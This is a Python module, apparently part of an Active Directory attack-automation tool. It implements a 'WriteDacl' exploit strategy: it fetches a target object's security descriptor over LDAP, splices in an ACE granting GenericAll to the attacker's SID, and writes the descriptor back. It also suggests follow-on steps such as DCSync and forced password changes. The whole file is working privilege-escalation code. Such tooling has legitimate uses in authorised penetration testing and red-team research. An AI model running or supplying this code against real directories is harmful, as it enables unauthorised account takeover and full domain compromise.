import logging
import struct
from tabnanny import check
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
from ldap3 import MODIFY_REPLACE

from entities.edge import Edge
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind

logger = logging.getLogger(__name__)


class WriteDaclStrategy:

    GENERIC_ALL  = 0x10000000
    SD_FLAGS_OID = "1.2.840.113556.1.4.801"

    def __init__(self, client_entity, target_dn_override: str = None):
        self.client = client_entity
        self.target_dn_override = target_dn_override

    def exploit(self, edge: Edge) -> ExploitResult:
        if edge.kind != EdgeKind.WRITE_DACL:
            return ExploitResult(
                technique="WriteDacl",
                edge=edge,
                success=False,
                notes=f"Edge invalide : attendu WRITE_DACL, reçu {edge.kind}"
            )

        target_dn  = self.target_dn_override or edge.goal_node.distinguished_name
        source_sid = edge.source_node.objectid

        logger.info(f"[WriteDacl] {edge.source_node.label} → {edge.goal_node.label}")

        try:
            raw_sd       = self._fetch_security_descriptor(target_dn)
            new_sd_bytes = self._inject_generic_all(raw_sd, source_sid)
            self._write_security_descriptor(target_dn, new_sd_bytes)

            logger.info(f"[WriteDacl] ✅ GenericAll accordé sur {edge.goal_node.label}")

            return ExploitResult(
                technique="WriteDacl",
                edge=edge,
                success=True,
                notes=(
                    f"ACE GenericAll ajouté sur '{edge.goal_node.label}' "
                    f"pour '{edge.source_node.label}' ({source_sid})"
                ),
                next_steps=["ForceChangePassword", "DCSync", "AddMember"]
            )

        except PermissionError as e:
            return self._fail(edge, f"Droits insuffisants : {e}")
        except Exception as e:
            logger.exception("[WriteDacl] Erreur inattendue")
            return self._fail(edge, str(e))

    # ------------------------------------------------------------------ #

    def _fetch_security_descriptor(self, target_dn: str) -> bytes:
        """
        Récupère le SD COMPLET (Owner + Group + DACL) avec flag 0x07.
        On a besoin de Owner+Group pour reconstruire un SD valide.
        """
        conn = self.client.ldap_connection
        conn.search(
            search_base=target_dn,
            search_filter="(objectClass=*)",
            attributes=["nTSecurityDescriptor"],
            controls=[(self.SD_FLAGS_OID, True, b"\x30\x03\x02\x01\x07")]
            #                                                       ↑ 0x07 = Owner+Group+DACL
        )
        if not conn.entries:
            raise ValueError(f"Objet introuvable : {target_dn}")
        raw = conn.entries[0]["nTSecurityDescriptor"].raw_values
        if not raw:
            raise ValueError(f"nTSecurityDescriptor vide pour {target_dn}")

        print(f"[DEBUG] SD complet récupéré : {len(raw[0])} octets")
        off_owner = struct.unpack_from("<I", raw[0], 4)[0]
        off_group = struct.unpack_from("<I", raw[0], 8)[0]
        off_dacl  = struct.unpack_from("<I", raw[0], 16)[0]
        print(f"[DEBUG] Offsets lus — Owner:{off_owner} Group:{off_group} Dacl:{off_dacl}")

        return raw[0]

    def _inject_generic_all(self, raw_sd: bytes, trustee_sid: str) -> bytes:
        # ── Lire les offsets ──────────────────────────────────────────────
        raw_sd    = bytes(raw_sd)
        off_own   = struct.unpack_from("<I", raw_sd, 4)[0]
        off_grp   = struct.unpack_from("<I", raw_sd, 8)[0]
        off_sacl  = struct.unpack_from("<I", raw_sd, 12)[0]
        off_dacl  = struct.unpack_from("<I", raw_sd, 16)[0]

        old_acl_rev   = raw_sd[off_dacl]
        old_ace_count = struct.unpack_from("<H", raw_sd, off_dacl + 4)[0]

        # ── Construire l'ACE ──────────────────────────────────────────────
        sid = LDAP_SID()
        sid.fromCanonical(trustee_sid)
        sid_bytes = sid.getData()
        ace_size  = 4 + 4 + len(sid_bytes)
        ace_bytes = struct.pack("<BBH", 0x00, 0x00, ace_size)
        ace_bytes += struct.pack("<I", self.GENERIC_ALL)
        ace_bytes += sid_bytes

        # ── Extraire les parties du SD original ───────────────────────────
        part_aces_orig = raw_sd[off_dacl + 8 : off_own]   # ACEs existants
        part_suffix    = raw_sd[off_own:]                   # Owner + Group

        # ── Nouvelle DACL ─────────────────────────────────────────────────
        new_aces      = ace_bytes + part_aces_orig
        new_ace_count = old_ace_count + 1
        new_acl_size  = 8 + len(new_aces)
        new_dacl      = struct.pack("<BBHHH", old_acl_rev, 0, new_acl_size, new_ace_count, 0)
        new_dacl      += new_aces

        delta = len(new_dacl) - (off_own - off_dacl)

        # ── Assembler le nouveau SD ───────────────────────────────────────
        new_body = raw_sd[:off_dacl] + new_dacl + part_suffix

        # ── Patcher les offsets IN-PLACE via bytearray ────────────────────
        new_sd = bytearray(new_body)
        struct.pack_into("<I", new_sd, 4,  off_own  + delta)
        struct.pack_into("<I", new_sd, 8,  off_grp  + delta)
        struct.pack_into("<I", new_sd, 12, (off_sacl + delta) if off_sacl != 0 else 0)
        # offset 16 (Dacl) reste inchangé
        new_sd = bytes(new_sd)

        # ── Vérification ─────────────────────────────────────────────────
        check = SR_SECURITY_DESCRIPTOR()
        check.fromString(new_sd)
        logger.debug(f"[WriteDacl] SD OK — AceCount={check['Dacl']['AceCount']}, taille={len(new_sd)}")

        return new_sd



    def _sid_size(self, data: bytes, offset: int) -> int:
        """Calcule la taille d'un SID à partir de son offset dans les bytes."""
        if offset == 0 or offset >= len(data):
            return 0
        # Structure SID : Revision(1) + SubAuthorityCount(1) + ... + SubAuthority[n](4 each)
        # Taille = 8 + SubAuthorityCount * 4
        sub_authority_count = data[offset + 1]
        return 8 + sub_authority_count * 4

    def _write_security_descriptor(self, target_dn: str, sd_bytes: bytes) -> None:
        """Envoie le SD complet reconstruit."""
        conn = self.client.ldap_connection

        result = conn.modify(
            dn=target_dn,
            changes={"nTSecurityDescriptor": [(MODIFY_REPLACE, [sd_bytes])]}
        )

        print(f"[DEBUG] LDAP modify result : {conn.result}")

        if not result:
            desc = conn.result.get("description", "?")
            msg  = conn.result.get("message", "")
            diag = conn.result.get("diagnosticMessage", "")
            raise PermissionError(f"{desc} | {msg} | {diag}")

    @staticmethod
    def _fail(edge: Edge, reason: str) -> ExploitResult:
        logger.warning(f"[WriteDacl] ❌ {reason}")
        return ExploitResult(
            technique="WriteDacl",
            edge=edge,
            success=False,
            notes=reason
        )